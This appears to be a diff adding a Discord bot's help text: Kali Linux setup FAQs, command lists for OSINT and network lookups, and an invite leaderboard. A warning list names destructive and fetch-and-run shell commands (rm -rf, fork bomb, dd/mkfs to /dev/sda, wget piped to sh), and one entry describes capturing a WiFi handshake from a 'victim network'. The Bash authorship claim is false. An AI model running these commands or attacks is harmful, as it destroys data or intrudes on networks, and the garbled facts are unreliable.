@@ -1,0 +1,503 @@
+1. How To Install Kali Linux?
+2. Things To Do After Installing Kali Linux
+3. Where Can I Download Kali Linux/Images?
+4. What Is The Linux Kernel?
+5. What Are The Components Of Linux?
+6. What Is Special About Kali Linux?
+7. How To Become Root In Linux?
+8. How To Reset Username And Password In Kali Linux?
+9. How To Install Kali Linux On Android Using Linux Deploy?
+10. What Is BASH?
+11. How Do You Change Permissions Under Linux?
+12. Most Dangerous Linux Commands You Should Never Execute
+13. How To Create/Remove A User In Kali Linux?
+14. How To Install A Wireless Adapter On Kali Linux?
+15. How To Connect To A Wireless WiFi In Kali Linux?
+16. How To Check If Your Wireless Network Adapter Supports Monitor Mode & Packet Injection?
+Other Commands
+>ls help
+>ls help2
+Projects
+Phisherprice
+Amazing People That Helped Making This Bot
+Profile 1
+Profile 2
+
+
+1
+----------------------------------------------------------------
+How To Install Kali Linux?
+Installing Kali Linux
+
+First you will need to pick what method you want to use to setup Kali Linux. The methods are...
+
+• Installing Kali Linux by making a Kali (Linux) bootable USB drive
+
+• Kali Linux hard disk install
+
+• Using virtualization software, such as VMware or VirtualBox
+
+• Dual booting Kali Linux with the operating system
+
+Once you picked what method you go, and Google how to install Kali Linux on the method you picked.
+Question 1
+
+2
+----------------------------------------------------------------------------
+Things To Do After Installing Kali Linux
+1. Update, Upgrade, & Dist-Upgrade
+$ sudo apt-get clean
+$ sudo apt-get update
+$ sudo apt-get upgrade -y
+$ sudo apt-get dist-upgrade -y
+$ sudo apt-get remove
+
+2. Customization: Improve Kali Linux’s Look & Feel
+$ sudo apt install gnome-tweaks
+$ gnome-tweaks
+
+3. Filezilla FTP Client
+$ sudo apt install filezilla filezilla-common -y
+
+4. Install Tor Browser
+$ sudo apt install tor
+
+5. Disable the Screen Lock
+LINK FOR IMAGE: https://www.fossmint.com/wp-content/uploads/2019/11/Disable-Screen-Lock-in-Kali-Linux.png
+LINK FOR IMAGE: https://www.fossmint.com/wp-content/uploads/2019/11/Off-Screen-Lock-in-Kali-Linux.png
+
+6. Install Software Center
+$ sudo apt install software-center
+
+7. Install GDebi Package Manager
+$ sudo apt install gdebi
+
+8. Install Katoolin
+$ sudo apt install git
+$ sudo git clone https://github.com/LionSec/katoolin.git
+$ sudo cp katoolin/katoolin.py /usr/bin/katoolin
+$ sudo chmod +x /usr/bin/katoolin
+$ sudo katoolin
+
+9. Install VLC Media Player
+$ sudo apt install vlc
+If you want to run VLC as root use the command:
+$ sudo sed -i s/geteuid/getppid/g /usr/bin/vlc
+
+10. Install Every Available Hacking Tool In Kali Linux
+$ sudo apt install kali-linux-everything
+
+11. Change The Default Password
+$ passwd
+Question 2
+
+3
+----------------------------------------------------------------
+Where Can I Download Kali Linux/Images?
+Kali Linux Images
+
+You can download Kali Linux from this link
+https://www.kali.org/downloads/
+Old versions
+http://archive.kali.org/kali-images/
+Kali Linux Arm Images
+https://www.offensive-security.com/kali-linux-arm-images/
+
+Sometimes there might be issues with downloading kali-linux iso, its always best to check the iso after it has been downloaded, this will verify that the iso has been downloaded correctly, is not a virus and has not been hijacked during downloading, to do this click sha256sum on this site: http://onlinemd5.com/
+Then you will see a long string of numbers, compare this to that on the site: https://www.kali.org/downloads/
+If these numbers match then the iso is downloaded
+
+We generate fresh Kali Linux image files every few months, which we make available for download. This page provides the links to download Kali Linux in its latest official release. For a release history, check our Kali Linux Releases page. Please note: You can find unofficial, untested weekly releases at http://cdimage.kali.org/kali-weekly/. Downloads are rate limited to 5 concurrent connections.
+Question 3
+
+4
+----------------------------------------------------------------
+What Is The Linux Kernel?
+It is the main component of a Linux Operating System and is the core interface between a computer's hardware and its processes. It communicates between the two, managing resources as efficiently as possible.
+
+The kernel has four jobs:
+
+Memory management: It keeps track of the amount of memory used.
+
+Process management: It determines which process can use the CPU, when, and for how long.
+
+Device drivers: It acts as a mediator/interpreter between the hardware and processes.
+
+System calls and security: It receives a request for service from the processes.
+Question 4
+
+5
+----------------------------------------------------------------
+What Are The Components Of Linux?
+Linux architecture has four component:
+
+Hardware: RAM, HDD, CPU together constitute the Hardware layer for the LINUX operating system.
+
+Kernel: It is a core part of the Linux OS. It is responsible for many activities in the LINUX OS. There are two types of Kernel - Monolithic and MicroKernel.
+
+Shell: It is an interface between the user and the kernel.
+
+Utilities: Functions can be utilized from the System utilities.
+Question 5
+
+6
+----------------------------------------------------------------
+What Is Special About Kali Linux?
+Kali Linux is a Debian-based Linux distribution aimed at advanced Penetration Testing and Security Auditing. Kali contains several hundred tools which are geared towards various information security tasks, such as Penetration Testing, Security research, Computer Forensics and Reverse Engineering. Kali Linux is developed, funded and maintained by Offensive Security, a leading information security training company.
+Question 6
+
+7
+----------------------------------------------------------------
+How to Become Root In Linux?
+Gaining Root Access in the Terminal
+
+The "root" account on a Linux computer is the account with full privileges. Root access is often necessary for performing commands in Linux, especially commands that affect system files. Because root is so powerful, it's recommended to only request root access when necessary, as opposed to logging in as the root user. This can help prevent accidental damage to important system files.
+
+1. Open the terminal. If the terminal is not already open, open it. Many distributions allow you to open it by pressing [Ctrl]+[Alt]+T.
+
+2. Type sudo su - and press [↵ Enter]. This will attempt to log you in as "super user." You can actually use this command to log in as any user on the machine, but when left blank it will attempt to log in as root.
+
+3. Enter the root password when prompted. After typing su - and pressing [↵ Enter], you'll be prompted for the root password.
+
+4. Check the command prompt. When you are logged in as root, the command prompt should end with # instead of $.
+
+5. Enter the commands that require root access. Once you've used su - to log in as root, you can run any commands that require root access. The su command is preserved until the end of the session, so you don't need to keep re-entering the root password every time you need to run a command.
+
+6. Consider using sudo instead of su -. sudo ("super user do") is a command that lets you run other commands as root temporarily. This is the best way for most users to run root commands, as the root environment is not maintained, and the user doesn't need to know the root password. Instead, the user will enter their own user password for temporary root access.
+
+• Type sudo command and press [↵ Enter] (e.g. sudo ifconfig). When prompted for the password, enter your user password, not the root password.
+• sudo is the preferred method for distributions like Ubuntu, where it will work even when the root account is locked.
+Question 7
+
+8
+----------------------------------------------------------------
+How To Reset Username And Password In Kali Linux?
+Reseting username and password in Kali Linux
+
+[The default login for the new Kali Linux is Username: kali Password: kali]
+[The default login for the old Kali Linux is Username: root Password: toor]
+
+Step 1: Open the Kali Linux and try to login, if you cannot log in and the password which you enter does not work, go to the right top corner click Restart.
+
+Step 2: In the second, when it restarts always comes two options, select the second option (Advance Options for Kali GNU/Linux) and press the Enter from the keyboard.
+
+Step 3: Again two options will appear for you, so you have to select the second one (Kali GNU/Linux, with Linux 4.13.0-Kali1-amd64 (recovery mode)) then press (e) for boot menu. Do not press Enter.
+
+Step 4: You will see some new options. You have to eliminate the (o) from (sda1 ro single initrd) and at the end of this line (when this line completely finishes) or when (install/gtk/initrd.org) then give space and type (init=/bin/bash).
+
+Step 5: After typing (init=/bin/bash) you should press (F10) for rebooting. F10 works in Dell computers in Hyper- V and computer both, but for HP you have to take pressed (Windows Key then press F10) in Hyper- V. After rebooting a new page with black background will appears. Type (passwd root) click Enter. Then type (root) and type it again it again. When you type the words you type a.re invisible but do not worry just type it and proceed. You will the message (Password Updated Successfully).
+
+Step 6: Close the page and open the Kali Linux again, this turn type (root) for username and password both of them. Do not type with capital letters just type with small letters then you will see that Kali Linux will open.
+
+Step 7: Congratulations! You are done.
+
+BIOS Keys by Manufacturer
+Link: https://www.tomshardware.com/uk/reviews/bios-keys-to-access-your-firmware,5732.html
+Question 8
+
+9
+----------------------------------------------------------------
+How To Install Kali Linux On Android Using Linux Deploy?
+Install Kali Linux on any Android Phone or Tablet
+
+Prerequisites
+
+• A device running Android 2.1 and above, rooted.
+• At least 5 GB free space on internal or external storage.
+• A fast, wireless internet connection.
+• Patience to wait for a distribution to bootstrap from the network.
+
+Configuring Linux Deploy for Kali
+There’s actually very little to be done to get Kali installed. By choosing Kali Linux in the “Distribution” tab, you’ve pretty much covered the important stuff. Optionally, you can choose your architecture, verify that the Kali mirror is correct, set your installation type and location on your Android device, etc. Generally speaking, the defaults provided by Linux Deploy are good to begin with.
+
+Building the Kali Image
+install-kali-linux-deploy
+
+Once you are happy with all the settings, hitting the “install” button will start a Kali Linux bootstrap directly from our repositories. Depending on your Internet connection speed, this process could take a while. You’ll be downloading a base install of Kali Linux (with no tools) at minimum.
+
+Starting up your chrooted Kali
+Once the installation is complete, hit the “start” button. You should see Linux Deploy setting up your image with output similar to the following:
+
+At this stage, Linux Deploy has started a VNC and SSH server inside your chrooted Kali image. You can connect to the Kali session remotely using the IP address assigned to your Android device (in my case, 10.0.0.10).
+
+Logging in to your chrooted Kali
+Now you can use either a SSH or VNC client to access your Kali instance. The VNC password is “changeme” and the SSH credentials are “android” for the username (configured via Linux Deploy) and “changeme” as the password.
+
+Image Size Considerations
+If left unchanged, Linux Deploy will automatically set an image size of around 4 GB, for a “naked” installation of Kali. If you would like to install additional Kali tools down the road, you might want to consider using a larger image size, which is configurable via the settings in Linux Deploy.
+Question 9
+
+10
+----------------------------------------------------------------
+What Is BASH?
+BASH is short for Bourne Again SHell. It was written by Steve Bourne as a replacement to the original Bourne Shell (represented by /bin/sh). It combines all the features from the original version of Bourne Shell, plus additional functions to make it easier and more convenient to use. It has since been adapted as the default shell for most systems running Linux.
+Question 10
+
+11
+----------------------------------------------------------------
+How Do You Change Permissions Under Linux?
+Assuming you are the system administrator or the owner of a file or directory, you can grant permission using the chmod command. Use + symbol to add permission or – symbol to deny permission, along with any of the following letters: u (user), g (group), o (others), a (all), r (read), w (write) and x (execute). For example, the command chmod go+rw FILE1.TXT grants read and write access to the file FILE1.TXT, which is assigned to groups and others.
+
+There are 3 kinds of permissions under Linux:- Read: users may read the files or list the directory- Write: users may write to the file of new files to the directory- Execute: users may run the file or lookup a specific file within a directory
+Question 11
+
+12
+----------------------------------------------------------------
+Most Dangerous Linux Commands You Should Never Execute
+1. rm -rf
+The rm -rf command is one of the fastest ways to delete a folder and its contents.
+
+2. : () {: |: &} ;:
+(fork bomb) It operates by defining a function called ”, which is called twice, once in the foreground and once in the background. It keeps running again and again until the system freezes.
+
+3. command> / dev / sda
+Command writes the output of ‘command on the block / dev / sda . The above command writes raw data and all files on the block will be replaced with raw data, resulting in total loss of data in the block.
+
+4. mv directory / dev / null
+This command basically moves all the files to / dev / null, yes, it means that it simply disappear all the files from the system.
+
+5. wget http: // malicious_source -O | sh
+Command will download a script from a malicious source and then run it on your system. The Wget command will download the script and sh command will run the downloaded script on your system.
+
+6. Mkfs.ext3 / dev / sda
+Command will simply format the block ‘sda’ and you will definitely know that after running the above command your Block (Hard Disk Drive) will be reset to NEW! Without the data, leaving the system in unrecoverable phase.
+
+7. > File
+The above command is used to release the file content. If the above command is executed with a typing error or ignorance as “> xt.conf” will write the configuration file or any other system or configuration file.
+
+8. ^ foo ^ bar
+This command is used to edit the previous command without the need to retype the entire command again. But it can be really problematic if you do not take the risk to carefully check the change in the original command using ^ ^ foo bar command.
+
+9. dd if = / dev / random of = / dev / sda
+The above command will end as / dev / sda and write random data for the block. Of course! Your system would be left in an inconsistent and unrecoverable phase.
+
+10. invisible Command
+This command here shows that the threat can be hidden and usually undetectable sometimes. Not compile / run code from an unknown source.
+Question 12
+
+13
+----------------------------------------------------------------
+How To Create/Remove A User In Kali Linux?
+To Create A User Do The Following...
+
+(Done In Root User)
+
+useradd -m user1
+-m creates a home directory for the user.
+
+passwd user1
+It will ask you to create a new password.
+
+usermod -a -G sudo user1
+The option -a means to add and '-G sudo' means to add the user to the sudo group. If you want to know more about the usermod command, issue man usermod command to know more about usermod
+
+chsh -s /bin/bash user1
+chsh command is used to change the login shell for a user.
+
+All done.! you are all set. You could logout and login to your new account.
+
+To Remove A User Do The Following...
+
+(Done In Root User)
+
+userdel –r user1
+-r means delete all files and home directory for user1.
+
+All done.! you are all set.
+Question 13
+
+14
+----------------------------------------------------------------
+How To Install A Wireless Adapter On Kali Linux?
+First Time Install
+sudo apt-get install realtek-rtl88xxau-dkms, verify it installs correctly by running the cmd again and this should say the below:
+LINK FOR IMAGE: https://virtuallyonit.files.wordpress.com/2018/09/kali-install.png
+
+• Power down your Kali Machine
+• Remove the USB adapter
+• Boot until host OS is up and ensure USB is recognized (devices > USB)
+• Start your virtualization platform (mine is Virtual box) in “settings” under “USB” leave the wireless adapter un-checked so it is not available when Kali boots.
+• Note: repeat this when starting Kali normally, un-known reason why Kali does not like the adapter being present when booting. (see below)
+
+sudo apt-get update
+
+sudo apt-get upgrade
+
+Add in USB adapter – In “Virtual Box” this is top menu bar “devices” > “USB” > and select your adapter
+LINK FOR IMAGE: https://virtuallyonit.files.wordpress.com/2018/09/usb-adapter.png?w=750
+
+Note: Commands don't seem to register the adapter so we need to restart the network manager
+ifconfig or iwconfig
+
+To restart network manager follow the below:
+sudo systemctl restart network-manager
+
+List USB devices attached to the machine you should get a list as pictured below:
+lsusb
+LINK FOR IMAGE: https://virtuallyonit.files.wordpress.com/2018/09/lsusb.png
+
+If you now run the below commands you can see the adapter registered:
+iwconfig ifconfig
+LINK FOR IMAGE: https://virtuallyonit.files.wordpress.com/2018/09/iwconfig.png?w=750
+
+Change your MAC address and switch your network adapter in to monitor mode, for example:
+ifconfig wlan 0 down 
+macchanger --random 
+ifconfig wlan 0 up
+and
+ifconfig wlan0 down 
+iwconfig wlan0 mode monitor 
+ifconfig wlan0 up 
+iwconfig
+
+Restarting Kali Machine
+
+The adapter is not recognized and your iwconfig commands return no value. To get around this do this:
+
+• Start Kali without the USB attached (under devices > USB)
+• Wait for Kali to boot and login
+• Add the USB device
+
+sudo systemctl restart network-manager
+
+• Verify adapter is up and running
+iwconfig
+Question 14
+
+15
+----------------------------------------------------------------
+How To Connect To A Wireless WiFi In Kali Linux?
+To connect Wi-Fi in Kali Linux follow these steps:
+
+• Open the Terminal
+• #sudo apt-get install kali-linux-wireless (for driver)
+• #iwconfig
+• #ifconfig wlan0 up
+• #ifconfig (to check wlan is coming or not)
+• Connect to wireless network
+
+OR
+
+On the top right hand corner.
+LINK FOR IMAGE: https://qph.fs.quoracdn.net/main-qimg-268546078d7c1224a38692313acf681c.webp
+
+OR
+
+On the terminal shell, use the following command:
+# nm-connection-editor
+LINK FOR IMAGE: https://qph.fs.quoracdn.net/main-qimg-c0bacb4780faa29c040bab9ddd9df58f.webp
+
+OR
+
+Use the following command, if you have no GUI
+# nmtui
+LINK FOR IMAGE: https://qph.fs.quoracdn.net/main-qimg-c224bacbd166ff1b271f11db9d3e2e65.webp
+Question 15
+
+16
+----------------------------------------------------------------
+How To Check If Your Wireless Network Adapter Supports Monitor Mode & Packet Injection?
+Test Your Existing Wireless Network Adapter
+
+If you already have a wireless network adapter, you can check pretty easily if the chipset inside supports monitor mode and packet injection. To start, plug in the network adapter and then open a terminal window. You should be able to determine the chipset of the network adapter by simply typing lsusb -vv into the terminal window.
+
+Put Your Card in Monitor Mode
+
+For this step, we'll break out Airmon-ng, but before that, you'll need to locate the name of the interface. On your system, run the command ifconfig (or ip a) to see a list of all devices connected. On Kali Linux, your card should be listed as something like wlan0 or wlan1.
+
+nce you have the name of the network interface, you can attempt to put it into monitor mode by typing airmon-ng start wlan0 (assuming your interface name is wlan0). If you see the output below, then your card appears to support wireless monitor mode.
+You can confirm the results by typing iwconfig, and you should see the name of your card has changed to add a "mon" at the end of your card's name. It should also report "Mode:Monitor" if it has been successfully put into monitor mode.
+
+Test Your Card for Packet Injection
+
+Starting with your interface in monitor mode, make sure you are in proximity to a few Wi-Fi networks so that the adapter has a chance of succeeding. Then, in a terminal window, type aireplay-ng --test wlan0mon to start the packet injection test.
+
+Test with an Attack to Make Sure Everything Works
+
+Type the besside-ng -R 'Target Network' wlan0mon command, with the -R field replaced with the name of your test network. It will begin attempting to grab a handshake from the victim network. For this to work, there must be a device connected to the Wi-Fi network you're attacking. If there isn't a device present, then there is no one to kick off the network so you can't try to capture the handshake.
+Question 16
+
+
+
+--------------------------------------------------------------------------------
+
+ping - Ping the bot
+atb - About this bot
+wnews <Country code> - Look up news
+nsearch <Search> - Search news about any topic
+fakeprofile - Generate a fake profile
+iplookup <IP> - Lookup IP information
+pingiw <IP/Domain> - Ping an IP or a domain
+updatelog - The update log
+whoisweb <Domain> - Lookup whois domain information
+scrapep - Scrape proxies (Hourly)
+kali tools - View all Kali Linux tools
+shorten <URL> - Shorten any URL
+emailinfo <Email> - Get email information
+urlinfo <URL> - Get URL information
+pnlookup <Phone number> - Lookup phone number information (no space between numbers)
+virustotal <Domain> - Scan domains to see if they're safe or not
+ipinfo <IP> - Get more IP information
+maclookup <MAC address> - Get MAC address information
+gmlookup <Place> - Lookup places in Google maps
+cpass - Advanced password generator
+ddg <Search> - DuckDuckGo search engine
+useragent <User agent> - Analyze a User Agent header
+ghuserinfo <Username> - Lookup GitHub user information
+clookup <Country name> - Lookup country information
+cblookup <ID> - Lookup certified Discord bot information
+gender <Name> - Will predict the genders name
+uptime - View the uptime status
+botinfo - Get the bots information
+chttp2 <Domain> - Check if domain supports HTTP/2
+cmsd <URL/Domain> - Check a URL or a domain content management system
+userinfo <ID> - See the user information
+ytcinfo <Channel ID> - Get information about the YouTube channel
+ppc <Password> - Check for pwned passwords
+random <Length> - Random emoji, number, hex color and word(s) generator
+(Moderator Command) mm <ID> <Reason> - Mute a member forever. This is considered as a ban.
+(Moderator Command) mun <ID> - Umute a member
+
+
+---------------------------------------------------------------
+sherlock <Username> - Search for social media accounts faster
+sherlock2 <Username> - Search for social media accounts faster (original tool)
+weather <Country/city> - Lookup the weather in any country or city
+google <Search> - Google search engine
+hashid <Hash> - Hash identifier
+sc <URL> - Take a screenshot from any website
+
+Other Commands
+whoami - Will show who you are in the server
+dnslookup <Domain> - Lookup domain DNS information
+pllookup <Domain> - Lookup domain page links
+httph <Domain> - Get domain HTTP headers
+whoisip <IP> - Get whois IP information (works with domains aswell)
+pingip <IP> - Ping an IP (works with domains aswell)
+snlookup <IP/netmask> - Lookup IP subnet information
+tcpps <IP/Domain> - Scan an IP or a domain TCP ports (nmap)
+mtrt <IP/Domain> - Traceroute an IP or a domain
+dnshr <Domain> - Get the DNS host records of a domain
+ztt <Domain> - Run a domain zone transfer test
+sdnss <IP/Domain> - Get an IP or a domain shared DNS servers
+rdnslookup <IP/Domain> - Lookup an IP or a domain reverse DNS
+distros - Will list Linux distributions for hacking and penetration testing
+blc - View some basic Linux commands
+ris <Upload image> - Will display some basic information about the image and some reverse image search engines
+nslookup <Domain> - DNS lookup
+cc - Create a character
+
+
+--------------------------------------------------------------------------------
+
+1. Jackisawes - 1494 invites (1520 regular, 0 bonus, -2 fake, -24 leaves)
+2. DISBOARD - 505 invites (541 regular, 0 bonus, -4 fake, -32 leaves)
+3. Queen - 83 invites (87 regular, 0 bonus, -1 fake, -3 leaves)
+4. ServerMate - 50 invites (50 regular, 0 bonus, 0 fake, 0 leaves)
+5. ! All Baby - 6 invites (7 regular, 0 bonus, 0 fake, -1 leaves)
+6. El Dorado - 3 invites (3 regular, 0 bonus, 0 fake, 0 leaves)
+7. Lucid - 3 invites (4 regular, 0 bonus, 0 fake, -1 leaves)
+8. Randomale - 3 invites (3 regular, 0 bonus, 0 fake, 0 leaves)
+9. A Simp Nam - 2 invites (2 regular, 0 bonus, 0 fake, 0 leaves)
+10. Annoying B - 1 invites (1 regular, 0 bonus, 0 fake, 0 leaves)
+
